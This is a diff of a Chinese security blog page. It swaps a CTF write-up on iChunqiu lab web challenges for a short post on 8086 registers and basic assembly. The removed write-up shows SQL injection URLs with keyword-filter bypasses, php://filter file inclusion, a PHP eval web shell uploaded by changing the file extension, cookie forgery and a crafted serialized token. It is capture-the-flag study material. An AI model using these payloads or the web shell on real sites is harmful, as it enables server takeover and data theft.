@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>I春秋CTF训练营web题解（一） · SuperY4Ng&#39;s Blog</title>
+    <title>8086通用指令 · SuperY4Ng&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >SuperY4Ng&#39;s Blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">I春秋CTF训练营web题解（一）</a>
+                <a href="#" class="post-name">8086通用指令</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            I春秋CTF训练营web题解（一）
+            8086通用指令
             <!-- 404 -->
             
         </h1>
@@ -266,18 +266,18 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "二进制">二进制</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1.1k</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">422</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/09/16</span>
+                    <span class="post-intro-time">2018/10/16</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -401,98 +401,28 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Ps:该文章首发于CSDN:https://blog.csdn.net/Super_Yiang/article/details/82391768</span></span><br></pre></td></tr></table></figure>
-<h4 id="（1）include"><a href="#（1）include" class="headerlink" title="（1）include"></a>（1）include</h4><p>==hint：没错！就是文件包含漏洞.==</p>
-<p>点开链接，发现</p>
-<p><img src="https://s1.ax1x.com/2018/09/02/PzPytJ.md.png" alt="PzPytJ.md.png"></p>
-<p>通过源码可知可以提交一个path的变量，通过ctrl+f搜索allow_url_include，发现是打开状态：</p>
-<p><img src="https://s1.ax1x.com/2018/09/02/PzPvB8.md.png" alt="PzPvB8.md.png"></p>
-<p>所以打开火狐浏览器，用hackbar工具输入：</p>
-<p><img src="https://s1.ax1x.com/2018/09/02/PzipNQ.png" alt="PzipNQ.png"></p>
-<p>发现存在疑似含有flag的文件</p>
-<p><img src="https://s1.ax1x.com/2018/09/02/Pzikj0.png" alt="Pzikj0.png"></p>
-<p>接着使用php://filter协议查看曝露出来的文件的内容，因为PHP文件是在不能直接显示的，所以使用了base64编码显示</p>
-<p><img src="https://s1.ax1x.com/2018/09/02/PziJHO.png" alt="PziJHO.png"></p>
-<p>然后解码就可以得到flag了</p>
-<p><img src="https://s1.ax1x.com/2018/09/02/Pziw8A.md.png" alt="Pziw8A.md.png"></p>
-<h4 id="（2）SQL"><a href="#（2）SQL" class="headerlink" title="（2）SQL"></a>（2）SQL</h4><p>==hint：出题人就告诉你这个是个注入，有种别走！==</p>
-<p>创建链接点进去，然后查看源码</p>
-<p><img src="https://s1.ax1x.com/2018/09/03/Pzemss.md.png" alt="Pzemss.md.png"></p>
-<p>很明显知道用sql注入，用火狐hackbar进行手动注入，先爆字段</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 order by 4</span><br></pre></td></tr></table></figure>
-<p><img src="https://s1.ax1x.com/2018/09/03/Pze1iT.md.png" alt="Pze1iT.md.png"></p>
-<p>说明存在过滤，试试/**/，关键词大写，不行，然后尝试&lt;&gt;发现可以</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 ord&lt;&gt;er by 4</span><br></pre></td></tr></table></figure>
-<p><img src="https://s1.ax1x.com/2018/09/03/PzeNLR.md.png" alt="PzeNLR.md.png"></p>
-<p>没出现结果，所以接下来继续爆字段,4不对就二分法换2，然后发现还是没结果，换3有了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 ord&lt;&gt;er by 2</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 ord&lt;&gt;er by 3</span><br></pre></td></tr></table></figure>
-<p><img src="https://s1.ax1x.com/2018/09/03/Pzeae1.md.png" alt="Pzeae1.md.png"></p>
-<p>然后输入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,2,3 from info</span><br></pre></td></tr></table></figure>
-<p><img src="https://s1.ax1x.com/2018/09/03/PzeWwt.png" alt="PzeWwt.png"></p>
-<p>说明第二个字段可以显示，那么接下来就是爆数据库名，表名，列名:</p>
-<p>①爆数据库名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,database(),3 from info</span><br></pre></td></tr></table></figure>
-<p>②爆表名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,table_name,3 from information_schema.tables where table_schema=&apos;sqli&apos;</span><br></pre></td></tr></table></figure>
-<p>③爆列名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,column_name,3 from information_schema.columns where table_name=&apos;sqli&apos;</span><br></pre></td></tr></table></figure>
-<p>发现疑似存在flag的列</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,flAg_T5ZNdrm,3 from sqli.info</span><br></pre></td></tr></table></figure>
-<p>flag就出来了。</p>
-<h4 id="（3）Do-you-know-upload"><a href="#（3）Do-you-know-upload" class="headerlink" title="（3）Do you know upload"></a>（3）Do you know upload</h4><p>==hint：加油吧，少年。==</p>
-<p>创建链接，点开</p>
-<p><img src="https://s1.ax1x.com/2018/09/03/Pzs8hV.png" alt="Pzs8hV.png"></p>
-<p>很明显文件上传，试着上传已经写好的PHP一句话木马</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>然后改为jpg格式上传抓包，并改为php后缀就可以成功上传。</p>
-<p><img src="https://s1.ax1x.com/2018/09/03/PzsBA1.png" alt="PzsBA1.png"></p>
-<p>因为我之前已经成功上传过了1.php文件，显示已存在，如果是第一次上传就会显示路径：upload/1.php</p>
-<p><img src="https://s1.ax1x.com/2018/09/03/PzsLuQ.png" alt="PzsLuQ.png"></p>
-<p>然后就是菜刀连接，打开</p>
-<p><img src="https://s1.ax1x.com/2018/09/03/PzypCV.md.png" alt="PzypCV.md.png"></p>
-<p>发现config.php和ctf.sql，flag应该存在数据库中，点开config.php可以看到数据库的信息</p>
-<p><img src="https://i.loli.net/2018/09/03/5b8cfa6a6d4c5.png" alt=""></p>
-<p>然后用菜刀编写shell连接到数据库查看flag。</p>
-<h4 id="（4）broken"><a href="#（4）broken" class="headerlink" title="（4）broken"></a>（4）broken</h4><p>==hint：you got a file,but…==</p>
-<p>点开链接，发现file是个超链接，点进去</p>
-<p><img src="https://i.loli.net/2018/09/03/5b8d2f6f6b077.png" alt=""></p>
-<p>一看jother编码，放进浏览器控制台，发现末尾少了一个]，加上后出现错误</p>
-<p><img src="https://i.loli.net/2018/09/03/5b8d3098dff26.png" alt=""></p>
-<p>于是删除最后面的()，再次输入得到[Array(1)]，打开就可以看到flag了。</p>
-<h4 id="（5）who-are-you"><a href="#（5）who-are-you" class="headerlink" title="（5）who are you?"></a>（5）who are you?</h4><p>==hint：我是谁，我在哪，我要做什么？==</p>
-<p>点开链接进去，显示</p>
-<p><img src="https://i.loli.net/2018/09/03/5b8d386d864b0.png" alt=""></p>
-<p>然后抓包发现cookie参数有问题</p>
-<p><img src="https://i.loli.net/2018/09/03/5b8d38a85a2fb.png" alt=""></p>
-<p>猜测是base64编码，拿去解码得</p>
-<p><img src="https://i.loli.net/2018/09/03/5b8d390189eb1.png" alt=""></p>
-<p>是Rot13，运行脚本解码得到guest，尝试将guest换成admin用脚本进行Rot13加密得到Zjo1OiJucXp2YSI7，再重新放入cookie中</p>
-<p><img src="https://i.loli.net/2018/09/03/5b8d39de575a8.png" alt=""></p>
-<p>可以看到已经成功登陆并且说可以上传，旁边有一条注释</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- $filename = $_POST[&apos;filename&apos;]; $data = $_POST[&apos;data&apos;]; --&gt;</span><br></pre></td></tr></table></figure>
-<p>所以将请求包改成POST形式，然后输入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=2.php&amp;data[]=&lt;?php eval($_POST[&apos;a&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
-<p>再次提交</p>
-<p><img src="https://i.loli.net/2018/09/03/5b8d39cbbb1ba.png" alt=""></p>
-<p>找到路径，输入进去看看就可以得到flag。</p>
-<h4 id="（6）Login"><a href="#（6）Login" class="headerlink" title="（6）Login"></a>（6）Login</h4><p>==hint：加油，我看好你==</p>
-<p>点开链接，是一个登录界面</p>
-<p><img src="https://i.loli.net/2018/09/04/5b8df38fd1ab5.png" alt=""></p>
-<p>做web题习惯性的点开页面源代码看，发现一行注释，虽然在页面下面</p>
-<p><img src="https://i.loli.net/2018/09/04/5b8df3ede8efd.png" alt=""></p>
-<p>猜测是账号密码，输入登录发现成功登录，然而登录了并没有什么东西，抓包看看</p>
-<p><img src="https://i.loli.net/2018/09/04/5b8df4aa946e2.png" alt=""></p>
-<p>发现member.php这页刷新返回包中有一个show参数，猜测可以show source，所以改包，加上一个show参数并设为1</p>
-<p><img src="https://i.loli.net/2018/09/04/5b8df5a930d62.png" alt=""></p>
-<p>发现真的出现了源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($requset[<span class="string">'token'</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">		$login = unserialize(gzuncompress(base64_decode($requset[<span class="string">'token'</span>])));</span><br><span class="line">		$db = <span class="keyword">new</span> db();</span><br><span class="line">		$row = $db-&gt;select(<span class="string">'user=\''</span>.mysql_real_escape_string($login[<span class="string">'user'</span>]).<span class="string">'\''</span>);</span><br><span class="line">		<span class="keyword">if</span>($login[<span class="string">'user'</span>] === <span class="string">'ichunqiu'</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> $flag;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>($row[<span class="string">'pass'</span>] !== $login[<span class="string">'pass'</span>])&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'unserialize injection!!'</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"(╯‵□′)╯︵┴─┴ "</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
-<p>重要的就是这段,编写代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">array</span>(<span class="string">'user'</span>=&gt;<span class="string">'ichunqiu'</span>);</span><br><span class="line">$a=base64_encode(gzcompress(serialize($a)));</span><br><span class="line"><span class="keyword">echo</span> $a</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>运行得到token</p>
-<p><img src="https://i.loli.net/2018/09/04/5b8df71053d38.png" alt=""></p>
-<p>然后放到cookie中提交就可以得到flag。</p>
+        <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">PS：https://blog.csdn.net/Super_Yiang/article/details/83098536</span></span><br></pre></td></tr></table></figure>
+<h4 id="8086寄存器"><a href="#8086寄存器" class="headerlink" title="8086寄存器"></a>8086寄存器</h4><p>8086 有14个16位寄存器，这14个寄存器按其用途可分为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(1)通用寄存器</span><br><span class="line"></span><br><span class="line">(2)指令指针</span><br><span class="line"></span><br><span class="line">(3)标志寄存器</span><br><span class="line"></span><br><span class="line">(4)段寄存器等4类。</span><br></pre></td></tr></table></figure>
+<p> 有8个, 又可以分成2组，一组是数据寄存器(4个),另一组是指针寄存器及变址寄存器(4个)。</p>
+<p>顾名思义，通用寄存器是那些你可以根据自己的意愿使用的寄存器，修改他们的值通常不会对计算机的运行造成很大的影响。 </p>
+<p><img src="https://i.loli.net/2018/10/16/5bc5512b1983d.png" alt=""></p>
+<p>通用寄存器的数据寄存器是两个字节，以AX为例，分为高8位（AH）低8位（AL）</p>
+<p><img src="https://i.loli.net/2018/10/16/5bc595391ffef.png" alt=""></p>
+<h4 id="基础汇编指令"><a href="#基础汇编指令" class="headerlink" title="基础汇编指令"></a>基础汇编指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add al,1(如果ax=00FFH,那么ax会等于=0000H,进位标志CF变为1）al的值加1赋给al</span><br><span class="line">sub al,1 al的值减1赋给al</span><br><span class="line">mov ax,[1000H]  把值为1000H的地址放到ax</span><br><span class="line">push ax ESP指向的地址减2，把ax里的值压入栈</span><br><span class="line">pop ax  ESP指向的地址加2，把ax里的值弹出栈</span><br></pre></td></tr></table></figure>
+<p>CPU是从高地址往低地址读取。</p>
+<p><img src="https://i.loli.net/2018/10/16/5bc591559a6bd.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/16/5bc591a327aec.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/16/5bc5933ede6e8.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/16/5bc5f0adf1575.png" alt=""></p>
+<h4 id="物理地址"><a href="#物理地址" class="headerlink" title="物理地址"></a>物理地址</h4><p>在存储器里以字节为单位存储 信息，为正确地存放或取得信息，每一个字节单元给以一个唯一的存储器地址，称为物理地址，又叫实际地址或绝对地址。</p>
+<p>8086是16位的CPU，地址总线是20位</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">物理地址=段地址*10H+偏移地址</span><br><span class="line">例：</span><br><span class="line">CS：2000H，IP：0033H</span><br><span class="line">物理地址=2000H*10H+0033H=20033H</span><br></pre></td></tr></table></figure>
+<h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><p>先进后出，后进先出，是从高地址往低地址存入。</p>
+<p>ESP指向当前的栈顶，EBP是基址指针。</p>
+<h4 id="内存寻址方式"><a href="#内存寻址方式" class="headerlink" title="内存寻址方式"></a>内存寻址方式</h4><p><img src="https://i.loli.net/2018/10/16/5bc5874307af1.png" alt=""></p>
+<h4 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h4><p><img src="https://i.loli.net/2018/10/16/5bc5ec7fbecd4.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/16/5bc5edc3f1a10.png" alt=""></p>
 
     </article>
     <!-- license  -->
@@ -501,17 +431,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/09/16/渗透测试初步学习之信息收集/" title= "渗透测试初步学习之信息收集">
-                    <div class="nextTitle">渗透测试初步学习之信息收集</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/09/16/web开发快速入门(一)/" title= "WEB开发快速入门（一）">
-                    <div class="prevTitle">WEB开发快速入门（一）</div>
+                <a href= "/2018/10/14/护网杯WP/" title= "护网杯WP">
+                    <div class="prevTitle">护网杯WP</div>
                 </a>
             
         </li>
@@ -641,7 +566,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#（1）include"><span class="toc-number">1.</span> <span class="toc-text">（1）include</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#（2）SQL"><span class="toc-number">2.</span> <span class="toc-text">（2）SQL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#（3）Do-you-know-upload"><span class="toc-number">3.</span> <span class="toc-text">（3）Do you know upload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#（4）broken"><span class="toc-number">4.</span> <span class="toc-text">（4）broken</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#（5）who-are-you"><span class="toc-number">5.</span> <span class="toc-text">（5）who are you?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#（6）Login"><span class="toc-number">6.</span> <span class="toc-text">（6）Login</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#8086寄存器"><span class="toc-number">1.</span> <span class="toc-text">8086寄存器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#基础汇编指令"><span class="toc-number">2.</span> <span class="toc-text">基础汇编指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#物理地址"><span class="toc-number">3.</span> <span class="toc-text">物理地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#栈"><span class="toc-number">4.</span> <span class="toc-text">栈</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#内存寻址方式"><span class="toc-number">5.</span> <span class="toc-text">内存寻址方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#标志寄存器"><span class="toc-number">6.</span> <span class="toc-text">标志寄存器</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
